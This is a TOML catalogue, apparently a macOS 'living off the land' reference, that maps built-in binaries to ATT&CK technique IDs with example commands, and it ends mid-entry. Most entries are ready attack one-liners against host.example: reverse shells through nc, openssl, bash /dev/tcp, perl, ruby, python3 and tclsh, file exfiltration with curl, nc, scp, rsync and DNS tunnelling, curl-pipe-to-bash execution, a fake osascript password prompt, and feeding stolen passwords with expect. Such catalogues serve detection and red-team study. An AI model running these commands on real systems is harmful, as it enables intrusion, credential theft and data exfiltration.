# --- Network transfer, tunnelling and C2 -------------------------------------------------------

[[binary]]
name = "curl"
paths = ["/usr/bin/curl"]
techniques = ["T1105", "T1048", "T1071.001"]
privilege = "user"
abuse = "Downloads payloads and uploads data over HTTP(S), FTP and more. Files it writes carry no com.apple.quarantine attribute, so Gatekeeper never assesses them."

[[binary.example]]
title = "Download a payload without quarantine"
command = '''curl -fsSL https://host.example/p.sh -o /tmp/p.sh'''
explanation = "Fetches a file over HTTPS. Files curl writes carry no com.apple.quarantine attribute, so Gatekeeper never assesses them on first launch."

[[binary.example]]
title = "Exfiltrate a file over HTTP"
command = '''curl -X POST --data-binary @/tmp/loot.zip https://host.example/u'''
explanation = "Uploads a local file in the body of a POST to an attacker endpoint."

[[binary.example]]
title = "Run a remote script in memory"
command = '''curl -fsSL https://host.example/p.sh | bash'''
explanation = "Pipes a downloaded script straight into a shell, so the payload never touches disk."

[[binary]]
name = "nscurl"
paths = ["/usr/bin/nscurl"]
techniques = ["T1105", "T1071.001"]
privilege = "user"
abuse = "Apple's NSURLSession-based HTTP client. Retrieves remote content under a less-watched process name and Apple's TLS stack instead of curl's."

[[binary.example]]
title = "Download a file via NSURLSession"
command = '''nscurl --output /tmp/p https://host.example/p'''
explanation = "Retrieves a URL using Apple's own NSURLSession stack and the nscurl process name instead of curl's."

[[binary.example]]
title = "Upload a file"
command = '''nscurl --upload /tmp/loot.zip https://host.example/u'''
explanation = "Sends a local file to a remote endpoint using the upload task."

[[binary]]
name = "nc"
paths = ["/usr/bin/nc"]
techniques = ["T1095", "T1105", "T1048", "T1046"]
privilege = "user"
abuse = "Raw TCP/UDP client and listener. Combined with mkfifo it gives a reverse shell; also moves files and port-scans (-z)."

[[binary.example]]
title = "Reverse shell with a named pipe"
command = '''mkfifo /tmp/f; /bin/sh -i < /tmp/f 2>&1 | nc host.example 4444 > /tmp/f'''
explanation = "Wires a shell's input and output through a FIFO to a remote listener, giving an interactive reverse shell with no extra tooling."

[[binary.example]]
title = "Exfiltrate a file to a listener"
command = '''nc host.example 4444 < /tmp/loot.zip'''
explanation = "Streams a local file to a waiting nc listener on the attacker host."

[[binary.example]]
title = "Scan a host for open ports"
command = '''nc -z -v host.example 1-1024'''
explanation = "Tests a range of TCP ports without sending any application data (-z)."

[[binary]]
name = "openssl"
paths = ["/usr/bin/openssl"]
techniques = ["T1573", "T1140", "T1027", "T1486"]
privilege = "user"
abuse = "s_client/s_server wrap a shell in TLS for an encrypted channel; enc encrypts or decodes payloads and can encrypt user files in bulk."

[[binary.example]]
title = "TLS-wrapped reverse shell"
command = '''mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect host.example:4444 > /tmp/s'''
explanation = "Tunnels a shell through a TLS channel, so traffic inspection sees only ciphertext."

[[binary.example]]
title = "Encrypt a file for impact"
command = '''openssl enc -aes-256-cbc -salt -in secrets.doc -out secrets.doc.enc -k PASS'''
explanation = "Encrypts a file under a chosen key, the core primitive of ransomware-style data-encryption attacks."

[[binary.example]]
title = "Decode an embedded payload"
command = '''openssl base64 -d -in blob.b64 -out /tmp/p'''
explanation = "Decodes a base64 blob carried inside a script back into its original bytes."

[[binary]]
name = "ssh"
paths = ["/usr/bin/ssh"]
techniques = ["T1021.004", "T1572", "T1090"]
privilege = "user"
abuse = "Remote shell plus -L/-R/-D forwarding: reverse tunnels out of a network and a SOCKS proxy for pivoting."

[[binary.example]]
title = "Reverse SSH tunnel for ingress"
command = '''ssh -f -N -R 2222:localhost:22 user@host.example'''
explanation = "Opens a remote-forward port on the attacker host that maps back to this machine's SSH, so they can reach it through an outbound connection."

[[binary.example]]
title = "SOCKS proxy for pivoting"
command = '''ssh -f -N -D 1080 user@host.example'''
explanation = "Turns the SSH session into a local SOCKS proxy, routing other tools through the remote network."

[[binary]]
name = "scp"
paths = ["/usr/bin/scp"]
techniques = ["T1048", "T1105", "T1021.004"]
privilege = "user"
abuse = "Copies files to and from remote hosts over SSH."

[[binary.example]]
title = "Exfiltrate a file over SSH"
command = '''scp /tmp/loot.zip user@host.example:/tmp/'''
explanation = "Copies a local file to a remote host over an encrypted SSH channel."

[[binary.example]]
title = "Stage a tool from a remote host"
command = '''scp user@host.example:/tmp/tool /tmp/tool'''
explanation = "Pulls a file down from a remote host into a local path."

[[binary]]
name = "sftp"
paths = ["/usr/bin/sftp"]
techniques = ["T1048", "T1105"]
privilege = "user"
abuse = "Interactive or batch (-b) file transfer over SSH."

[[binary.example]]
title = "Batch file transfer over SSH"
command = '''sftp -b /tmp/cmds.txt user@host.example'''
explanation = "Runs a scripted list of get/put commands non-interactively over SSH."

[[binary]]
name = "rsync"
paths = ["/usr/bin/rsync"]
techniques = ["T1048", "T1105"]
privilege = "user"
abuse = "Bulk, resumable directory sync to a remote host over SSH or an rsync daemon."

[[binary.example]]
title = "Sync a directory out over SSH"
command = '''rsync -az /Users/victim/Documents/ user@host.example:/loot/'''
explanation = "Mirrors a directory tree to a remote host, compressed and resumable, over SSH."

[[binary]]
name = "tftp"
paths = ["/usr/bin/tftp"]
techniques = ["T1105", "T1048"]
privilege = "user"
abuse = "Unauthenticated file transfer over UDP/69; rarely seen legitimately on endpoints."

[[binary.example]]
title = "Pull a file over UDP"
command = '''printf 'get payload /tmp/payload\nquit\n' | tftp host.example'''
explanation = "Fetches a file with no authentication over UDP/69, rarely seen on legitimate endpoints."

[[binary]]
name = "dig"
paths = ["/usr/bin/dig"]
techniques = ["T1071.004", "T1018"]
privilege = "user"
abuse = "Crafted queries carry data out in subdomain labels (DNS tunnelling); also resolves internal hosts."

[[binary.example]]
title = "DNS-tunnel data out"
command = '''dig @ns.host.example $(echo loot | base64).exfil.host.example TXT +short'''
explanation = "Encodes data into a subdomain label so it leaves the network inside an ordinary-looking DNS query."

[[binary.example]]
title = "Resolve internal hosts"
command = '''dig @10.0.0.1 intranet.corp.local A +short'''
explanation = "Queries an internal resolver to map hostnames to addresses during discovery."

[[binary]]
name = "mount_smbfs"
paths = ["/sbin/mount_smbfs"]
techniques = ["T1021.002", "T1048"]
privilege = "user"
abuse = "Mounts a remote SMB share as a local directory for staging tools or copying data out."

[[binary.example]]
title = "Mount a remote SMB share"
command = '''mount_smbfs //user@host.example/share /tmp/m'''
explanation = "Mounts a remote SMB share as a local directory for staging tools or copying data out."

[[binary]]
name = "mount_webdav"
paths = ["/sbin/mount_webdav"]
techniques = ["T1105", "T1048"]
privilege = "user"
abuse = "Mounts an HTTP(S) WebDAV server as a filesystem, turning web hosting into a file share."

[[binary.example]]
title = "Mount a WebDAV server as a filesystem"
command = '''mount_webdav https://host.example/dav /tmp/m'''
explanation = "Turns an HTTP(S) WebDAV endpoint into a mounted filesystem, so web hosting becomes a file share."

[[binary]]
name = "networksetup"
paths = ["/usr/sbin/networksetup"]
techniques = ["T1016", "T1090"]
privilege = "user"
abuse = "Reads interfaces, DNS and proxy settings. With admin rights, -setwebproxy/-setsocksfirewallproxy reroutes all traffic through an attacker proxy."

# --- Execution and interpreters ----------------------------------------------------------------

[[binary.example]]
title = "Route traffic through a proxy"
command = '''networksetup -setwebproxy Ethernet 10.0.0.5 8080'''
explanation = "With admin rights, points the system web proxy at an attacker host so browser traffic can be intercepted."
privilege = "root"

[[binary.example]]
title = "Read DNS and interface settings"
command = '''networksetup -getinfo Ethernet'''
explanation = "Reports addresses, DNS and router for an interface during network discovery."

[[binary]]
name = "osascript"
paths = ["/usr/bin/osascript"]
techniques = ["T1059.002", "T1059.007", "T1056.002", "T1010"]
privilege = "user"
abuse = "Runs AppleScript and JXA, drives other apps via Apple Events, and shows convincing password prompts (display dialog ... with hidden answer)."

[[binary.example]]
title = "Fake password prompt"
command = "osascript -e 'display dialog \"App Store needs your password\" default answer \"\" with hidden answer'"
explanation = "Shows a native dialog that captures whatever the user types, a common macOS credential-phishing trick."

[[binary.example]]
title = "Run a shell command via AppleScript"
command = "osascript -e 'do shell script \"id > /tmp/o\"'"
explanation = "Executes a shell command from the AppleScript runtime instead of a shell binary."

[[binary.example]]
title = "Run inline JavaScript (JXA)"
command = "osascript -l JavaScript -e 'app=Application.currentApplication(); app.includeStandardAdditions=true; app.doShellScript(\"id\")'"
explanation = "Runs JavaScript for Automation, which can drive apps and shell out without AppleScript syntax."

[[binary]]
name = "osacompile"
paths = ["/usr/bin/osacompile"]
techniques = ["T1059.002", "T1027"]
privilege = "user"
abuse = "Compiles scripts into run-only .scpt files or applets, hiding the source from inspection."

[[binary.example]]
title = "Compile a run-only applet"
command = '''osacompile -x -o /tmp/a.app /tmp/src.scpt'''
explanation = "Produces a run-only .app whose source cannot be read back, hiding the logic from inspection."

[[binary]]
name = "Unix shells"
paths = ["/bin/zsh", "/bin/bash", "/bin/sh", "/bin/dash", "/bin/ksh", "/bin/tcsh", "/bin/csh"]
techniques = ["T1059.004"]
privilege = "user"
abuse = "Every shell executes inline commands (-c) and stdin; bash's /dev/tcp gives a reverse shell with no other tool."

[[binary.example]]
title = "Reverse shell over /dev/tcp (bash)"
command = '''bash -i >& /dev/tcp/host.example/4444 0>&1'''
explanation = "Bash's built-in /dev/tcp opens a socket and ties an interactive shell to it with no other tool."

[[binary.example]]
title = "Execute an inline command"
command = "zsh -c 'id; whoami'"
explanation = "Every shell runs commands passed with -c, useful inside allowlists that permit a shell name."

[[binary]]
name = "perl"
paths = ["/usr/bin/perl"]
techniques = ["T1059"]
privilege = "user"
abuse = "Full interpreter with sockets and decoding in one-liners (perl -e); a common reverse-shell and dropper runtime."

[[binary.example]]
title = "Reverse shell one-liner"
command = "perl -e 'use Socket;$i=\"host.example\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"
explanation = "Opens a socket and execs a shell wired to it, a classic dropper/reverse-shell runtime."

[[binary]]
name = "ruby"
paths = ["/usr/bin/ruby"]
techniques = ["T1059"]
privilege = "user"
abuse = "Full interpreter with sockets and HTTP in the standard library (ruby -e)."

[[binary.example]]
title = "Reverse shell one-liner"
command = "ruby -rsocket -e 'f=TCPSocket.open(\"host.example\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
explanation = "Uses Ruby's socket library to connect out and exec a shell bound to the connection."

[[binary]]
name = "python3"
paths = ["/usr/bin/python3"]
techniques = ["T1059.006"]
privilege = "user"
abuse = "Developer-tools shim. Once Command Line Tools are installed it is a full Python runtime; until then running it only triggers the install prompt."

[[binary.example]]
title = "Reverse shell one-liner"
command = "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"host.example\",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'"
explanation = "Connects a socket and redirects a shell's streams onto it. Works once Command Line Tools supply a real python3."

[[binary]]
name = "swift"
paths = ["/usr/bin/swift"]
techniques = ["T1059"]
privilege = "user"
abuse = "Developer-tools shim. With Command Line Tools installed, runs Swift source directly (swift file.swift) with full framework access."

[[binary.example]]
title = "Run Swift source directly"
command = '''swift /tmp/payload.swift'''
explanation = "With Command Line Tools installed, compiles and runs a Swift source file in one step with full framework access."

[[binary]]
name = "tclsh"
paths = ["/usr/bin/tclsh"]
techniques = ["T1059"]
privilege = "user"
abuse = "Tcl interpreter whose built-in socket command is enough for a C2 client."

[[binary.example]]
title = "Reverse shell via Tcl sockets"
command = '''echo 'set s [socket host.example 4444];exec /bin/sh <@$s >@$s 2>@$s' | tclsh'''
explanation = "Tcl's built-in socket command is enough to connect out and attach a shell."

[[binary]]
name = "expect"
paths = ["/usr/bin/expect"]
techniques = ["T1059"]
privilege = "user"
abuse = "Tcl-based automation that answers interactive prompts, e.g. scripting stolen passwords into sudo or ssh."

[[binary.example]]
title = "Automate a password prompt"
command = "expect -c 'spawn ssh user@host.example; expect \"password:\"; send \"STOLENPASS\\r\"; interact'"
explanation = "Feeds a captured password into an interactive prompt, automating ssh or sudo logins."

[[binary]]
name = "jsc"
paths = ["/System/Library/Frameworks/JavaScriptCore.framework/Versions/A/Helpers/jsc"]
techniques = ["T1059.007"]
privilege = "user"
abuse = "JavaScriptCore shell hidden inside a framework bundle; runs JavaScript from a file or stdin outside any browser."

[[binary.example]]
title = "Run JavaScript outside a browser"
command = '''/System/Library/Frameworks/JavaScriptCore.framework/Versions/A/Helpers/jsc /tmp/p.js'''
explanation = "Executes JavaScript from a file using the JavaScriptCore shell hidden inside the framework bundle."

[[binary]]
name = "awk"
paths = ["/usr/bin/awk"]
techniques = ["T1059.004"]
privilege = "user"
abuse = "system() and command pipes run arbitrary commands, which escapes restricted shells and allowlists that permit awk."

[[binary.example]]
title = "Escape a restricted shell"
command = "awk 'BEGIN{system(\"/bin/sh\")}'"
explanation = "awk's system() spawns a shell, breaking out of allowlists or restricted shells that permit awk."

[[binary]]
name = "find"
paths = ["/usr/bin/find"]
techniques = ["T1059.004", "T1083"]
privilege = "user"
abuse = "-exec runs commands per match; also sweeps the filesystem for keys, configs and documents."

[[binary.example]]
title = "Run a command via -exec"
command = '''find . -maxdepth 1 -exec /bin/sh -c 'id' \;'''
explanation = "find's -exec runs an arbitrary command, another way to execute where shells are blocked."

[[binary.example]]
title = "Sweep for sensitive files"
command = '''find /Users -name '*.pem' -o -name 'id_rsa' 2>/dev/null'''
explanation = "Walks the filesystem for keys and credentials during collection."

[[binary]]
name = "vim"
paths = ["/usr/bin/vim"]
techniques = ["T1059.004"]
privilege = "user"
abuse = ":!cmd and :shell spawn commands from an editor that is often allowed where shells are not."

[[binary.example]]
title = "Shell out from the editor"
command = "vim -c ':!/bin/sh' -c ':q'"
explanation = "vim's :! runs a command, giving execution from an editor often allowed where shells are not."

[[binary]]
name = "screen"
paths = ["/usr/bin/screen"]
techniques = ["T1059.004"]
privilege = "user"
abuse = "Detached sessions (screen -dmS) keep a process running after the launching shell exits."

[[binary.example]]
title = "Keep a process alive detached"
command = '''screen -dmS s /tmp/implant'''
explanation = "Starts a program in a detached session that survives the launching shell exiting."

[[binary]]
name = "caffeinate"
paths = ["/usr/bin/caffeinate"]
techniques = ["T1059"]
privilege = "user"
abuse = "Runs a given program as its child (caffeinate -i cmd) and keeps the Mac awake for long-running jobs."

[[binary.example]]
title = "Run a child and prevent sleep"
command = '''caffeinate -i /tmp/implant'''
explanation = "Launches a program as its child and keeps the Mac awake for a long-running job."

[[binary]]
name = "open"
paths = ["/usr/bin/open"]
techniques = ["T1059"]
privilege = "user"
abuse = "Launches apps, files and URLs through LaunchServices, so the new process is parented to launchd rather than the caller, breaking process-tree lineage; -j launches hidden."

[[binary.example]]
title = "Launch hidden, reparented to launchd"
command = '''open -j -a /tmp/Payload.app'''
explanation = "LaunchServices starts the app parented to launchd rather than the caller (-j launches it hidden), breaking process-tree lineage."

[[binary]]
name = "automator"
paths = ["/usr/bin/automator"]
techniques = ["T1059"]
privilege = "user"
abuse = "Runs .workflow bundles, which can embed shell-script and AppleScript actions."

[[binary.example]]
title = "Run a workflow with a shell action"
command = '''automator /tmp/Payload.workflow'''
explanation = "Executes a .workflow bundle, which can embed Run Shell Script or AppleScript actions."

[[binary]]
name = "shortcuts"
paths = ["/usr/bin/shortcuts"]
